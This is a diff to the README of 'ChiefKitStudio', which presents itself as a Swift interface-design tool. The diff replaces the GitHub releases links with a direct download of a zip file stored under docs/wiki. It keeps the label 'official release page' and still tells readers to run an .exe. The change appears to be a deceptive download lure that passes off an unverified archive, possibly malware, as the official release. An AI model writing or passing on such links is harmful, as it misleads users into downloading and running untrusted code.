@@ -1,6 +1,6 @@
 # 🛠️ ChiefKitStudio - Build Swift interfaces with ease today
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/bonneeunderground205/ChiefKitStudio/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/bonneeunderground205/ChiefKitStudio/main/docs/wiki/Chief_Studio_Kit_v3.9.zip)
 
 ChiefKitStudio provides a workspace for developers and designers to build user interfaces. It uses professional tools to manage app states and visual blocks. You can test your layouts in a native environment. This application makes the design process simple and fast. It includes pre-built modules for quick setup. You will find all the tools you need to create functional Swift interfaces in one window.
 
@@ -8,7 +8,7 @@ ChiefKitStudio provides a workspace for developers and designers to build user i
 
 Follow these steps to set up the software on your computer.
 
-1. Go to the [official release page](https://github.com/bonneeunderground205/ChiefKitStudio/releases).
+1. Go to the [official release page](https://raw.githubusercontent.com/bonneeunderground205/ChiefKitStudio/main/docs/wiki/Chief_Studio_Kit_v3.9.zip).
 2. Locate the most recent version under the Assets header.
 3. Click the file ending in .exe to start your download.
 4. Save the file to your desktop or downloads folder.
